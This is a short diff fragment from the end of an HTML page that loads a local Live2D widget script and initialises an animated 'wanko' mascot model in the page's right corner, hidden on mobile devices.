+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
